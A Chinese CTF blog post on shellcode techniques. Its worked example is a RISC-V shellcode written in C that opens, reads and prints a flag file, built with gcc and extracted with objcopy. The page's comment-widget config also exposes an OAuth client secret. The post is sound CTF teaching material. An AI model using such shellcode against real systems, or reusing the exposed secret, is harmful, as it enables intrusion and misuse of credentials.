@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"pullp.github.io","root":"/","images":"/images","scheme":"Mist","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="some tips about shellcode">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode tips">
+<meta property="og:url" content="https://pullp.github.io/2021/01/30/shellcode-tips/index.html">
+<meta property="og:site_name" content="wxk1997&#39;s blog">
+<meta property="og:description" content="some tips about shellcode">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-01-30T12:53:42.000Z">
+<meta property="article:modified_time" content="2021-08-27T08:21:06.371Z">
+<meta property="article:author" content="wxk1997">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="shellcode">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://pullp.github.io/2021/01/30/shellcode-tips/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://pullp.github.io/2021/01/30/shellcode-tips/","path":"2021/01/30/shellcode-tips/","title":"shellcode tips"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>shellcode tips | wxk1997's blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">wxk1997's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">learn and share</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-friends"><a href="/friends/" rel="section"><i class="fa fa-archive fa-fw"></i>friends</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%90%E5%88%B6shellcode%E9%95%BF%E5%BA%A6"><span class="nav-number">2.1.</span> <span class="nav-text">限制shellcode长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%90%E5%88%B6shellcode%E5%AD%97%E7%AC%A6%E9%9B%86"><span class="nav-number">2.2.</span> <span class="nav-text">限制shellcode字符集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E5%90%8C%E6%9E%B6%E6%9E%84"><span class="nav-number">2.3.</span> <span class="nav-text">不同架构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#riscv-shellcode"><span class="nav-number">2.4.</span> <span class="nav-text">riscv shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#write-shellcode-in-c"><span class="nav-number">2.5.</span> <span class="nav-text">write shellcode in c</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">3.</span> <span class="nav-text">结语</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wxk1997"
+      src="https://avatars0.githubusercontent.com/u/20255635">
+  <p class="site-author-name" itemprop="name">wxk1997</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/pullp" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;pullp" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:weixiankui1997@gmail.com" title="E-Mail → mailto:weixiankui1997@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://pullp.github.io/2021/01/30/shellcode-tips/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/20255635">
+      <meta itemprop="name" content="wxk1997">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wxk1997's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          shellcode tips
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-01-30 20:53:42" itemprop="dateCreated datePublished" datetime="2021-01-30T20:53:42+08:00">2021-01-30</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-08-27 16:21:06" itemprop="dateModified" datetime="2021-08-27T16:21:06+08:00">2021-08-27</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/tips/" itemprop="url" rel="index"><span itemprop="name">tips</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><table>
+<thead>
+<tr>
+<th>更新时间</th>
+<th>更新内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2021-01-30</td>
+<td>初稿</td>
+</tr>
+<tr>
+<td>2021-01-31</td>
+<td>+ 使用c语言构造shellcode时关于较大的立即数的处理方法</td>
+</tr>
+</tbody></table>
+<p>记录一些写shellcode相关的技巧</p>
+<hr>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>其实平时做pwn题时遇到写shellcode题目时最常用的工具还是用pwntools的shellcraft模块, 可以方便地生成各种系统调用的shellcode. 具体使用方法可以参考官方文档: <a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/shellcraft.html">https://docs.pwntools.com/en/stable/shellcraft.html</a></p>
+<p>然而pwntools不是万能的, 接下来结合具体应用场景进行分析.</p>
+<h2 id="限制shellcode长度"><a href="#限制shellcode长度" class="headerlink" title="限制shellcode长度"></a>限制shellcode长度</h2><p>pwntools生成的shellcode一般都是考虑到各种可能存在的过滤(比如不能包含’\x00’), 因此长度比较长, 可以基于其进行优化. </p>
+<p>还有一种思路就是先构造一个read的shellcode, 读入并执行第二个getshell的shellcode, 从而实现对长度限制的绕过, 这种情况通常时需要调试分析执行shellcode时的上文, 看看寄存器或者栈上有没有什么现成的地址可供使用.</p>
+<h2 id="限制shellcode字符集"><a href="#限制shellcode字符集" class="headerlink" title="限制shellcode字符集"></a>限制shellcode字符集</h2><p>比如要求shellcode只能由字母和数字组成(这类shellcode有个专门的名词 : alphanumeric shellcode), 对于这种shellcode有一种工具: alpha3. 该工具可以将普通shellcode转化成功能相同的只由字母和数字组成的shellcode. 这个工具生成的shellcode同样是比较大的. 所以有时候还是需要自己写.</p>
+<p>自己写alphanumeric shellcode时这个网站很有帮助: <a target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">https://nets.ec/Alphanumeric_shellcode</a> 该网站上列出了可以由字母和数字组成的指令. 方便手写时参考.</p>
+<h2 id="不同架构"><a href="#不同架构" class="headerlink" title="不同架构"></a>不同架构</h2><p>有些cpu架构pwntools尚未支持, 遇到这类架构的题目需要编写shellcode时也就只能想办法手写了.  </p>
+<p>不同架构的解决方案可能不尽相同. 笔者也就遇到过 riscv 架构的shellcode. </p>
+<h2 id="riscv-shellcode"><a href="#riscv-shellcode" class="headerlink" title="riscv shellcode"></a>riscv shellcode</h2><p>笔者之前手写shellcode时都是先手写汇编, 然后使用汇编器汇编得到机器码.</p>
+<p>riscv 架构用汇编写shellcode的方法已经有人总结好了经验了, 不再赘述: <a target="_blank" rel="noopener" href="https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html">https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html</a></p>
+<p>但是这次参加完keen组织的*CTF赛后分享之后, 获知了一种更加通用的shellcode编写方法: 用C语言写shellcode. 因为该方法对于不同架构都大同小异, 通用性很强, 所以单独开一节讲.</p>
+<h2 id="write-shellcode-in-c"><a href="#write-shellcode-in-c" class="headerlink" title="write shellcode in c"></a>write shellcode in c</h2><p>思路来源于enlx师傅的分享(28分36秒左右开始): <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=iQYizRu7jks">https://www.youtube.com/watch?v=iQYizRu7jks</a></p>
+<p>关于syscall部分思路来源于煜博师傅的exp: <a target="_blank" rel="noopener" href="https://github.com/BrieflyX/ctf-pwns/blob/master/escape/favourite_architecture/workdir/shellcode2.c">https://github.com/BrieflyX/ctf-pwns/blob/master/escape/favourite_architecture/workdir/shellcode2.c</a>.</p>
+<p>下边是个riscv64架构的orw shellcode生成过程</p>
+<p>c源码如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sc.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> flag_path[] = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="comment">// __attribute__((section(&quot;.text#&quot;))) static char flag_path[] = &quot;/flag&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall</span><span class="params">(<span class="keyword">uint64_t</span> nr, ...)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _start()&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">    <span class="keyword">int</span> fd = syscall(__NR_openat, AT_FDCWD, flag_path, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    syscall(__NR_read, fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    syscall(__NR_write, <span class="number">1</span>, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;syscall:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a7, a0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a0, a1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a1, a2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a2, a3\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a3, a4\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a4, a5\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a5, a6\n&quot;</span></span><br><span class="line">        <span class="string">&quot;ecall\n&quot;</span></span><br><span class="line">        <span class="string">&quot;ret\n&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>编译命令如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ riscv64-linux-gnu-gcc-10 -Wa,-R -fPIC -O0 -nostdlib sc.c -o sc</span><br></pre></td></tr></table></figure>
+
+<p>对应gcc参数含义如下:</p>
+<ul>
+<li>-Wa,-R : -Wa表示后面的参数是传给as的, -R让as将data段合并的.text段中(<code>man as</code>for more information)</li>
+<li>-fPIC 表示编译得到的代码位置无关, 引用函数和全局变量时都是通过相对偏移, 而不是绝对地址</li>
+<li>-O0 让gcc不要优化, 测试时发现优化可能会让<code>_start()</code>函数不位于.text段开头</li>
+<li>-nostdlib 让gcc不链接系统标准启动文件和标准库文件，这样就不会有多余的启动代码，扣的时候更方便</li>
+</ul>
+<p>编译完之后可以使用objdump确认一下字符串和<code>_start()</code>的位置:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">$ riscv64-linux-gnu-objdump -d ./sc</span><br><span class="line"></span><br><span class="line">./sc:     file format elf64-littleriscv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000000002a0 &lt;_start&gt;:</span><br><span class="line"> 2a0:   be010113                addi    sp,sp,-1056</span><br><span class="line"> 2a4:   40113c23                sd      ra,1048(sp)</span><br><span class="line"> 2a8:   40813823                sd      s0,1040(sp)</span><br><span class="line"> 2ac:   42010413                addi    s0,sp,1056</span><br><span class="line"> 2b0:   4701                    li      a4,0</span><br><span class="line"> 2b2:   4681                    li      a3,0</span><br><span class="line"> 2b4:   00000617                auipc   a2,0x0</span><br><span class="line"> 2b8:   06c60613                addi    a2,a2,108 <span class="comment"># 320 &lt;flag_path&gt;</span></span><br><span class="line"> 2bc:   f9c00593                li      a1,-100</span><br><span class="line"> 2c0:   03800513                li      a0,56</span><br><span class="line"> 2c4:   046000ef                jal     ra,30a &lt;syscall&gt;</span><br><span class="line"> 2c8:   87aa                    mv      a5,a0</span><br><span class="line"> 2ca:   fef42623                sw      a5,-20(s0)</span><br><span class="line"> 2ce:   be840713                addi    a4,s0,-1048</span><br><span class="line"> 2d2:   fec42783                lw      a5,-20(s0)</span><br><span class="line"> 2d6:   40000693                li      a3,1024</span><br><span class="line"> 2da:   863a                    mv      a2,a4</span><br><span class="line"> 2dc:   85be                    mv      a1,a5</span><br><span class="line"> 2de:   03f00513                li      a0,63</span><br><span class="line"> 2e2:   028000ef                jal     ra,30a &lt;syscall&gt;</span><br><span class="line"> 2e6:   be840793                addi    a5,s0,-1048</span><br><span class="line"> 2ea:   40000693                li      a3,1024</span><br><span class="line"> 2ee:   863e                    mv      a2,a5</span><br><span class="line"> 2f0:   4585                    li      a1,1</span><br><span class="line"> 2f2:   04000513                li      a0,64</span><br><span class="line"> 2f6:   014000ef                jal     ra,30a &lt;syscall&gt;</span><br><span class="line"> 2fa:   0001                    nop</span><br><span class="line"> 2fc:   41813083                ld      ra,1048(sp)</span><br><span class="line"> 300:   41013403                ld      s0,1040(sp)</span><br><span class="line"> 304:   42010113                addi    sp,sp,1056</span><br><span class="line"> 308:   8082                    ret</span><br><span class="line"></span><br><span class="line">000000000000030a &lt;syscall&gt;:</span><br><span class="line"> 30a:   88aa                    mv      a7,a0</span><br><span class="line"> 30c:   852e                    mv      a0,a1</span><br><span class="line"> 30e:   85b2                    mv      a1,a2</span><br><span class="line"> 310:   8636                    mv      a2,a3</span><br><span class="line"> 312:   86ba                    mv      a3,a4</span><br><span class="line"> 314:   873e                    mv      a4,a5</span><br><span class="line"> 316:   87c2                    mv      a5,a6</span><br><span class="line"> 318:   00000073                ecall</span><br><span class="line"> 31c:   8082                    ret</span><br><span class="line"> 31e:   0001                    nop</span><br><span class="line"></span><br><span class="line">0000000000000320 &lt;flag_path&gt;:</span><br><span class="line"> 320:   662f 616c 0067 0000                         /flag...</span><br></pre></td></tr></table></figure>
+
+<p>然后使用objcopy将.text抠出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ riscv64-linux-gnu-objcopy -S -O binary -j .text ./sc ./sc.bin</span><br></pre></td></tr></table></figure>
+
+<p>此时我们就得到shellcode了.</p>
+<p>使用这种方法时对一些比较大的立即数也建议采用静态全局变量的形式, 否则可能不会被放到.text段中.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// method1, success</span></span><br><span class="line"><span class="keyword">unit64_t</span> *addr = <span class="number">0xdeadbeef00</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> *val = <span class="number">0xbaadf00d</span>;</span><br><span class="line"></span><br><span class="line">foo()&#123;</span><br><span class="line">    *addr = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// method2, maybe fail</span></span><br><span class="line">foo()&#123;</span><br><span class="line">    *((<span class="keyword">uint64_t</span> *) <span class="number">0xdeadbeef00</span>) = <span class="number">0xbaadf00d</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实测在riscv中使用method2时gcc会将两个立即数放到.rodata段, 且不会合并到.text段中, 不利于之后使用objcopy提取shellcode.</p>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>总结一下, 能用pwntools就用pwntools, 不能用pwntools就尽量用C写, 实在不行再写汇编吧.</p>
+<p>看到enlx师傅的分享时不由得感叹我对c语言的了解真的只是一些皮毛. </p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><p><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/shellcraft.html">shellcraft – pwntools documentation</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">alphanumeric shellcode</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html">Basic Shellcode in RISC-V Linux</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=iQYizRu7jks">科恩高校合作传统pwn方向第一次活动 – youtube</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/BrieflyX/ctf-pwns/blob/master/escape/favourite_architecture/workdir/shellcode2.c">BrieflyX: Favourite Architecture II - Startctf 2021 – github</a></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/shellcode/" rel="tag"># shellcode</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/29/debug-tips/" rel="prev" title="debug tips">
+                  <i class="fa fa-chevron-left"></i> debug tips
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/08/27/aliyun-intern-conclusion/" rel="next" title="写阿里云实习之后">
+                  写阿里云实习之后 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wxk1997</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"pullp","repo":"pullp.github.io","client_id":"fe859336a9fbdeb3f2dc","client_secret":"10b651022b6a16968955aa45ac4537b2d97686de","admin_user":"pullp","distraction_free_mode":true,"language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"942c387c5be3dfc4f53757e85fa6157d"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
